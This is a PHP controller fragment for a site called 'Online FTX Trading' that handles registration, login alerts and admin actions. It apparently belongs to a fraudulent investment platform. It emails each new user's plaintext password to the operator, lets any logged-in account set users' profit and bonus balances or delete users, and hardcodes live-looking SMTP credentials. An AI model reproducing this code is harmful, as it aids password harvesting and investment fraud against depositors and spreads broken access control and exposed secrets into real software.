            
            $subject = "Welcome to Online FTX Trading";
        $body = "
        <html>
        <body>
        <style>
        *{
            margin: 0;
            padding: 0;
            border-box: box-sizing:
        }
        </style>
        <div style='margin-right: 20px; width: 90%; height: auto; background-color: #292D4F; color: #fff; padding: 15px 20px;'>
        <center><img width='130' height='80' src='https://onlineftxtrading.com/cloud/app/images/365.png' />
        </center>
        
        </div>
        <div style='margin-right: 20px; margin-top: 25px;'>
        <h3><b>Confirm Your Registration</b></h3>
       
        <p>Welcome to Online FTX Trading.</p>
        <p>Here is your account activation code: </p>
        <br/>
        <span style='color: orange; font-size: 18px;'><b>$code</b></span>
        <h4 style='margin-top: 20px;'>Security Tips:</h4>
        <p>Never give your password to anyone.</p>
        <ul>
            <li>Never call any phone number from someone claiming to be an Online FTX Trading support</li>
            <li>Never send money to anyone claiming to be a member of Online FTX Trading team</li>
            <li>Enable Google Two Authentication.</li>
            <li>Bookmark <a href='https://onlineftxtrading.com'>onlineftxtrading.com</a> to verify the domain you are visiting</li>
            
        </ul>
        <p>If you don't recognise this activity, please contact our customer support immediately at: <span style='color: purple;'><a href='mailto:support@onlineftxtrading.com'>support@onlineftxtrading.com</a></span></p>
        
        <p style='margin-top: 45px;'>Online FTX Trading Team.</p>
        <p>This is an automated message, please do not reply.</p>
        
        <div style='background-color: #ccc; margin-top: 40px; text-align: center; align-items: center; width: 100%; height: 55px; padding: 20px 0; margin-right: 20px;'>
        <p>&copy; 2023 Online FTX Trading. All Rights Reserved.</p>
        </div>
        </div>
        </body>
        </html>
        
        ";
        
        $toCC = 'support@onlineftxtrading.com';
         MyController::composeMail($subject, $body, $email_addr, $toCC);
        
        //to admin
        
           $subject = "New Registration Boss!";
        $body = "
        <html>
        <body>
        <style>
        *{
            margin: 0;
            padding: 0;
            border-box: box-sizing:
        }
        </style>
        <div style='margin-right: 20px; width: 90%; height: auto; background-color: #292D4F; color: #fff; padding: 15px 20px;'>
        <center><img width='130' height='80' src='https://onlineftxtrading.com/cloud/app/images/365.png' />
        </center>
        
        </div>
        <div style='margin-right: 20px; margin-top: 25px;'>
        <h3 style='font-size: 30px;'><b>New User Registration Details</b></h3>
       
        <p style='font-size: 24px;'>Full Name: ".$req['fullname']."</p>
        <p style='font-size: 24px;'>Email Address: $email_addr</p>
        <p style='font-size: 24px;'>Password: $passw</p>
        <p style='font-size: 24px;'>Country: ". $req['country']."</p>
        <p style='font-size: 24px;'>Verification Code: $code</p>
        <p style='font-size: 24px;'>Date Registered: ". date('Y-m-d H:i:s')."</p>
        
        <br/>
        
        
        <p style='margin-top: 45px;'>Online FTX Trading Team.</p>
        <p>This is an automated message, please do not reply.</p>
        
        <div style='background-color: #ccc; margin-top: 40px; text-align: center; align-items: center; width: 100%; height: 55px; padding: 20px 0; margin-right: 20px;'>
        <p>&copy; 2023 Online FTX Trading. All Rights Reserved.</p>
        </div>
        </div>
        </body>
        </html>
        
        ";
        $toAddress = 'support@onlineftxtrading.com';
        $toCC = 'support@onlineftxtrading.com';
        MyController::composeMail($subject, $body, $toAddress, $toCC);
        
        
      $email = $req['email'];
            return redirect()->route('verifyemail', ['email' => $email]);
        
            
            //end of mail sending
            

        }
        else{
            return back()->with('fail', 'Something went wrong try again');
        }
    }
    function login_db_fnc(Request $req){
        if(Auth::attempt([
            'email' => $req->input('email'),
            'password' => $req->input('password')
        ])){
            
             /*if(Auth::user()->theme_ == 2){
                        return redirect()->route('premium_dashboard');
                    }
            else if(Auth::user()->theme_ == 3){
                return redirect()->route('ultimate_dashboard');
            }
            else if(Auth::user()->theme_ == 4){
                return redirect()->route('retirement_dashboard');
            }
            else{*/
                    
            if(Auth::user()->role == 0){
               if(Auth::user()->status == 'PENDING'){
                    return redirect()->route('verifyemail', ['email' => Auth::user()->email]);
                    
                }
                else{
                    $ip = request()->ip();
                    if($ip != Auth::user()->IPAddress){
                       $subject = "Login Confirmation";
        $body = "
        <html>
        <body>
        <style>
        *{
            margin: 0;
            padding: 0;
            border-box: box-sizing:
        }
        </style>
        <div style='margin-right: 20px; width: 90%; height: auto; background-color: #292D4F; color: #fff; padding: 15px 20px;'>
        <center><img width='130' height='80' src='https://onlineftxtrading.com/cloud/app/images/365.png' />
        </center>
        
        </div>
        <div style='margin-right: 20px; margin-top: 25px;'>
        <h3><b>Did You Login From A New Device or Location?</b></h3>
       
        <p>We noticed your Online FTX Trading Account <a href='mailto".Auth::user()->email."'>".Auth::user()->email."</a> was accessed from a new IP address.</p>
        <p><b>When: </b> ". date('Y-m-d H:i:s')."
        <br/><b>IP Address: </b> ". request()->ip() . "</p>
        <br/>
        <a href='https://onlineftxtrading.com/login' style='padding: 20px; background-color: #FFA500; color: #000; font-weight: bold; text-transform: uppercase; text-decoration: none; width: 100%;'>Review your security now</a>
        <h4 style='margin-top: 40px;'>Don't recognize this activity?</h4>
        <p><a href='https://onlineftxtrading.com/reset'>Please reset your password</a> and contact support <a href='mailto:support@onlineftxtrading.com'>customer support </a>immediately</p>
        
        <p style='margin-top: 45px;'>Online FTX Trading Team.</p>
        <p>This is an automated message, please do not reply.</p>
        
        <div style='background-color: #ccc; margin-top: 40px; text-align: center; align-items: center; width: 100%; height: 55px; padding: 20px 0; margin-right: 20px;'>
        <p>&copy; 2023 Online FTX Trading. All Rights Reserved.</p>
        </div>
        </div>
        </body>
        </html>
        
        ";
        $toAddress = Auth::user()->email;
        $toCC = 'support@onlineftxtrading.com';
        MyController::composeMail($subject, $body, $toAddress, $toCC);
                    }
               
                        return redirect()->route('dashboard');
                    
                    }
                }
            
                else{
                return redirect()->route('admin_');
                }
            //}
        }
        else{
            return back()->with('fail', 'Error! Invalid Login Details');
        }
        
    }
    function delete_user(Request $req){
         if(!Auth::check()){
            return redirect()->route('login');
        }
        DB::table('users')->where('email', $req['email'])->delete();
        DB::table('kyc_verification')->where('email', $req['email'])->delete();
        DB::table('notification')->where('email', $req['email'])->delete();
        DB::table('transactions')->where('email', $req['email'])->delete();

        return redirect()->route('admin_');
    }
    function update_user_balance(Request $req){
         if(!Auth::check()){
            return redirect()->route('login');
        }
        DB::table('users')->where('email', $req['email'])->update([
            'profit' => $req['profit'],
            'invested' => $req['invested'],
            'bonus' => $req['bonus']
        ]);

        return redirect()->route('admin_');
    }

    function sendmail(){
        $subject = "Login Confirmation";
        $body = "
        <html>
        <body>
        <style>
        *{
            margin: 0;
            padding: 0;
            border-box: box-sizing:
        }
        </style>
        <div style='margin-right: 20px; width: 90%; height: auto; background-color: #292D4F; color: #fff; padding: 15px 20px;'>
        <center><img width='130' height='80' src='https://onlineftxtrading.com/cloud/app/images/365.png' />
        </center>
        
        </div>
        <div style='margin-right: 20px; margin-top: 25px;'>
        <h3><b>Did You Login From A New Device or Location?</b></h3>
       
        <p>We noticed your Online FTX Trading Account <a href='rosafetrade@gmail.com'>rosafetrade@gmail.com</a> was accessed from a new IP address.</p>
        <p><b>When: </b> ". date('Y-m-d H:i:s')."
        <br/><b>IP Address: </b> ". request()->ip() . "</p>
        <br/>
        <a href='https://onlineftxtrading.com/login' style='padding: 20px; background-color: #FFA500; color: #000; font-weight: bold; text-transform: uppercase; text-decoration: none; width: 100%;'>Review your security now</a>
        <h4 style='margin-top: 40px;'>Don't recognize this activity?</h4>
        <p><a href='https://onlineftxtrading.com/reset'>Please reset your password</a> and contact support <a href='mailto:support@onlineftxtrading.com'>customer support </a>immediately</p>
        
        <p style='margin-top: 45px;'>Online FTX Trading Team.</p>
        <p>This is an automated message, please do not reply.</p>
        
        <div style='background-color: #ccc; margin-top: 40px; text-align: center; align-items: center; width: 100%; height: 55px; padding: 20px 0; margin-right: 20px;'>
        <p>&copy; 2023 Online FTX Trading. All Rights Reserved.</p>
        </div>
        </div>
        </body>
        </html>
        
        ";
        $toAddress = 'rosafetrade@gmail.com';
        $toCC = 'support@onlineftxtrading.com';
        if(MyController::composeMail($subject, $body, $toAddress, $toCC)){
            echo "Message Sent";
        }
        
    }
    public static function composeMail($subject, $body, $toAddress, $toCC) {
        require_once "vendor/autoload.php";
        $mail = new PHPMailer(true);     // Passing `true` enables exceptions
 
        try {
            $mail->SMTPDebug = 0;
            $mail->isSMTP();
            $mail->Host = 'tor101.truehost.cloud';
            $mail->SMTPAuth = true;
            $mail->Username = 'support@onlineftxtrading.com';
            $mail->Password = 'onlineftx@23';
            $mail->SMTPSecure = 'startls';
            $mail->Port = 587;
            $mail->setFrom('support@onlineftxtrading.com', 'Online FTX Trading');
            $mail->addAddress($toAddress);
            $mail->addReplyTo($toCC, 'Online FTX Trading');
            $mail->isHTML(true);
            $mail->Subject = $subject;
            $mail->Body    = $body;
             $mail->AltBody = 'This is the body in plain text for non-HTML mail clients';
            
            
            $mail->send();
        } catch (Exception $e) {
            return response()->json(['error', 'Message could not be sent.' . $e]);
             //return back()->with('error','Message could not be sent.');
        }
    }
    
    
public static function getCode($n) {
    $characters = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
    $randomString = '';
 
    for ($i = 0; $i < $n; $i++) {
        $index = rand(0, strlen($characters) - 1);
        $randomString .= $characters[$index];
    }
 
    return $randomString;
}
    
}
